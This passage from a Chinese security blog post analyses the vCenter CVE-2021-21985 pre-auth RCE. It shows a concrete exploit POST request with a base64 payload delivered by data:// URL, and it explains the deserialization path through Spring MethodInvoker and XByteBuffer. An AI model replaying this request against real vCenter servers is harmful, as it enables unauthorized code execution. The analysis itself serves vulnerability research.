+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url:/ui/h5-vsan/rest/proxy/service/vmodlContext/createContext</span><br><span class="line">post:</span><br><span class="line">&#123;&quot;methodInput&quot;:[[&quot;https://localhost/vsanHealth/vum/driverOfflineBundle/data://text/plain;base64,UEsDBBQABgAIAKhR2VL28uJjKgEAABwCAAASAAAAb2ZmbGluZV9idW5kbGUueG1slZE/a8MwEMX3QL6DUIfYQ85Ju5QQJ9BCaSFd8ge6qvLFUSpLQSdHhtLvXkc2JR2jRYL3fqe7e/NlU2l2RkfKmpxPYcIZGmkLZcqc77Yv40e+XAwH808UhlhrNpTzg/enWZaFEIBOrrXunagwWPcF1pUZyQNWIosIHw5YdyI7a0j948NDRO4nk2n28b7aRHSsDHlhJF7RpGZd3ZWVwsdub2iD3eDNupnGsX9oqODtAi4zxCUwVeT8FbW2UgsizuKV87tvg4EdxVmAsvBU7/fosFijKNAl19KbOdV+4x2Kqle3ScS0MCWsa+NVhSmU6Pt3kgI2KJNROFhRqVHUrqokaZqCVgapdUqrNUqf9DVrrzRQ/AyeO8k6SuFolWlza9Gfv+liYJesu+QWv1BLAQIUABQABgAIAKhR2VL28uJjKgEAABwCAAASACQAAAAAAAAAIAAAAAAAAABvZmZsaW5lX2J1bmRsZS54bWwKACAAAAAAAAEAGABFIh+oZ2nXAX3PbahnadcB2JnlV8Jo1wFQSwUGAAAAAAEAAQBkAAAAWgEAAAAA/xxxsasasdasd&quot;],true]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210625102039421.png" alt="image-20210625102039421"></p>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>​        这种攻击思路来自于<a target="_blank" rel="noopener" href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5">A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE</a>,这种攻击思路是在iswin师傅找到的MethodInvoker通过反射调用任意类的静态方法的基础上实现的，在vcenter中存在<code>org.apache.catalina.tribes.io.XByteBuffer#deserialize(byte[])</code>方法，该方法接收我们传入的字节数组并进行反序列化操作。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210625120100124.png" alt="image-20210625120100124"></p>
+<p>​        所以我们只要能调用到deserialize方法并传入字节数组就可以了，那么下一个技术难点在于如何传递一个字节数组。首先我们通过setArguments传入数据时，经过<code>com.vmware.vsan.client.services.ProxygenSerializer#deserializeMethodInput</code>时会对类型进行转换，无论传入什么类型，都会转换为Object数组类型。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629112401624.png" alt="image-20210629112401624"></p>
+<p>​        在调用<code>org.springframework.util.MethodInvoker#prepare</code>方法时，由于我们传入的是Object数组而调用<code>XByteBuffer#deserialize(byte[])</code>需要一个byte数组，所以这里调用<code>getMethod</code>会导致异常，进而调用到<code>findMatchingMethod</code>方法。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210625120251597.png" alt="image-20210625120251597"></p>
+<p>​        在<code>org.springframework.beans.support.ArgumentConvertingMethodInvoker#doFindMatchingMethod</code>中获取请求方法的参数类型，并调用<code>TypeConverter.convertIfNecessary</code>，通过这个函数将我们传入的Object数组转换为byte数组，这样就解决了传入byte数组的问题。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629094534142.png" alt="image-20210629094534142"></p>
+<p>​        下面看下我们传入什么样的数据到<code>convertIfNecessary</code>才可以转成我们需要的byte数组，跟到<code>convertIfNecessary</code>代码中进行分析,首先在<code>TypeConverterSupport </code>中，会调用<code>TypeConverterSupport。doConvert</code>，在<code>doConvert</code>中，会将请求委托给<code>TypeConverterDelegate</code>实现具体的转换逻辑。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629182439374.png" alt="image-20210629182439374"></p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629182548499.png" alt="image-20210629182548499"></p>
+<p>​        由于我们传入的是Object数组，所以会进入到<code>convertToTypedArray</code>方法。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629182657676.png" alt="image-20210629182657676"></p>
+<p>​        在<code>convertToTypedArray</code>将遍历Object数组的每个值，并转换为byte类型，存放到byte数组中。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629182819571.png" alt="image-20210629182819571"></p>
+<p>​        所以只要传入对象转换的字节数组对应的Int值，就可以通过转换得到对应的字节数组。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629183213861.png" alt="image-20210629183213861"></p>
+<p>​        下面我生成一个URLDNS利用链的对象，并得到字节数组的内容。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629183717319.png" alt="image-20210629183717319"></p>
+<p>​        将该数组的内容通过setArguements进行传递。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629184817242.png" alt="image-20210629184817242"></p>
+<p>​        再通过TypeConverter转换为byte数组</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629184949200.png" alt="image-20210629184949200"></p>
+<p>​        最终将序列化后的内容传递给<code>org.apache.catalina.tribes.io.XByteBuffer#deserialize(byte[])</code>，完成反序列化操作。</p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629185208890.png" alt="image-20210629185208890"></p>
+<p><img src="/2021/06/07/Vcenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210629185326834.png" alt="image-20210629185326834"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        这个漏洞的亮点还是挺多的，无论是通过<code>MethodInvoker</code>将调用任意bean扩展到调用任意静态方法，还是通过ssrf加载请求获取加载的xml，还有通过触发异常对数据类型转换，都体现出了前辈们漏洞研究上的功底，再次感谢师傅们的分享，最后感谢瓜哥帮我分析反序列化数据传递的问题。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://testbnull.medium.com/a-quick-look-at-cve-2021-21985-vcenter-pre-auth-rce-9ecd459150a5">A Quick Look at CVE-2021–21985 VCenter Pre-Auth RCE</a></p>
+<p><a target="_blank" rel="noopener" href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">VCSA 6.5-7.0 远程代码执行 CVE-2021-21985 漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">Vcenter Server CVE-2021-21985 RCE PAYLOAD</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
